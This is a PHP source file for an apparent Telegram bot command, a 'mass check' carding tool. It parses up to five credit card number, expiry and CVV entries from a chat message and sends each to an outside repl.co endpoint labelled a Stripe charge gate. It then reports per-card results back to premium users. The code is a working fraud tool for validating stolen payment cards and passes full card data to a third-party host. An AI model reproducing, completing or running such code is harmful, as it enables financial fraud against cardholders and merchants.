<?php
$time_start = microtime(true);
if ((strpos($message, "/mch") === 0) || (strpos($message, "!mch") === 0) || (strpos($message, ".mch") === 0)) {
	$pro = file_get_contents('pre.txt');
	$pros = explode("\n", $pro);
	if (in_array($chatId, $pros)) {
		sendaction($chatId, typing);

		$cc1 = substr($message, 5, 28);
		$ccz1 = multiexplode(array(":", "/", " ", "|"), $cc1)[0];
		$mesz1 = multiexplode(array(":", "/", " ", "|"), $cc1)[1];
		$anoz1 = multiexplode(array(":", "/", " ", "|"), $cc1)[2];
		$cvvz1 = multiexplode(array(":", "/", " ", "|"), $cc1)[3];
		$lista1 = ''.$ccz1.'|'.$mesz1.'|'.$anoz1.'|'.$cvvz1.'';
		$cc2 = substr($message, 34, 28);
		$ccz2 = multiexplode(array(":", "/", " ", "|"), $cc2)[0];
		$mesz2 = multiexplode(array(":", "/", " ", "|"), $cc2)[1];
		$anoz2 = multiexplode(array(":", "/", " ", "|"), $cc2)[2];
		$cvvz2 = multiexplode(array(":", "/", " ", "|"), $cc2)[3];
		$lista2 = ''.$ccz2.'|'.$mesz2.'|'.$anoz2.'|'.$cvvz2.'';
		$cc3 = substr($message, 63, 28);
		$ccz3 = multiexplode(array(":", "/", " ", "|"), $cc3)[0];
		$mesz3 = multiexplode(array(":", "/", " ", "|"), $cc3)[1];
		$anoz3 = multiexplode(array(":", "/", " ", "|"), $cc3)[2];
		$cvvz3 = multiexplode(array(":", "/", " ", "|"), $cc3)[3];
		$lista3 = ''.$ccz3.'|'.$mesz3.'|'.$anoz3.'|'.$cvvz3.'';
		$cc4 = substr($message, 92, 28);
		$ccz4 = multiexplode(array(":", "/", " ", "|"), $cc4)[0];
		$mesz4 = multiexplode(array(":", "/", " ", "|"), $cc4)[1];
		$anoz4 = multiexplode(array(":", "/", " ", "|"), $cc4)[2];
		$cvvz4 = multiexplode(array(":", "/", " ", "|"), $cc4)[3];
		$lista4 = ''.$ccz4.'|'.$mesz4.'|'.$anoz4.'|'.$cvvz4.'';
		$cc5 = substr($message, 121, 28);
		$ccz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[0];
		$mesz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[1];
		$anoz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[2];
		$cvvz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[3];
		$lista5 = ''.$ccz5.'|'.$mesz5.'|'.$anoz5.'|'.$cvvz5.'';

		$aray = gibarray($message);
		if (count($aray) > 5) {
			sendMessage($chatId, "<b>You can check 20 CCs at a time!</b>", $message_id);
			exit();
		} else {
			$sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[✦] STATUS: MASS CHECK INITIATED. WAIT...%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";

			$sent = json_decode(file_get_contents($sendmes), 1);
			$mes_id = $sent['result']['message_id'];

			$r1 = file_get_contents('https://response.artsvn.repl.co/api2.php?lista='.$lista1.'');
			$msg1 = trim(strip_tags(getStr($r1, ' <br>Result:', '</span><br>')));
			$ccr1 = "━━━━━━━━━━━━━%0A[✦] GATE: MASS STRIPE SK CHARGE %0A%0A[✦] 1st CC: <code>$lista1</code>%0A[✦] 1st CC RESULT: $msg1%0A━━━━━━━━━━━━━";
			editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A$ccr1</b>", $mes_id);
			$r2 = file_get_contents('https://response.artsvn.repl.co/api2.php?lista='.$lista2.'');
			$msg2 = trim(strip_tags(getStr($r2, ' <br>Result:', '</span><br>')));
			$ccr2 = "[✦] 2nd CC: <code>$lista2</code>%0A[✦] 2nd CC RESULT: $msg2%0A━━━━━━━━━━━━━";
			editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A$ccr1%0A$ccr2</b>", $mes_id);
			$r3 = file_get_contents('https://response.artsvn.repl.co/api2.php?lista='.$lista3.'');
			$msg3 = trim(strip_tags(getStr($r3, ' <br>Result:', '</span><br>')));
			$ccr3 = "[✦] 3rd CC: <code>$lista3</code>%0A[✦] 3rd CC RESULT: $msg3%0A━━━━━━━━━━━━━";
			editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3</b>", $mes_id);
			$r4 = file_get_contents('https://response.artsvn.repl.co/api2.php?lista='.$lista4.'');
			$msg4 = trim(strip_tags(getStr($r4, ' <br>Result:', '</span><br>')));
			$ccr4 = "[✦] 4th CC: <code>$lista4</code>%0A[✦] 4th CC RESULT: $msg4%0A━━━━━━━━━━━━━";
			editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4</b>", $mes_id);
			$r5 = file_get_contents('https://response.artsvn.repl.co/api2.php?lista='.$lista5.'');
			$msg5 = trim(strip_tags(getStr($r5, ' <br>Result:', '</span><br>')));
			$ccr5 = "[✦] 5th CC: <code>$lista5</code>%0A[✦] 5th CC RESULT: $msg5";
			editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5</b>", $mes_id);
			$time_end = microtime(true);
			$execution_time = ($time_end - $time_start);
			editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5%0A━━━━━━━━━━━━━%0A[✦] 5 CARDS CHECKED!✅%0A[✦] TIME TAKEN: $execution_time's%0A[✦] Checked By: @$username%0A[✦] UserID: $userId%0A[✦] Premium Activated: $stat%0A</b>", $mes_id);
		}
	}
}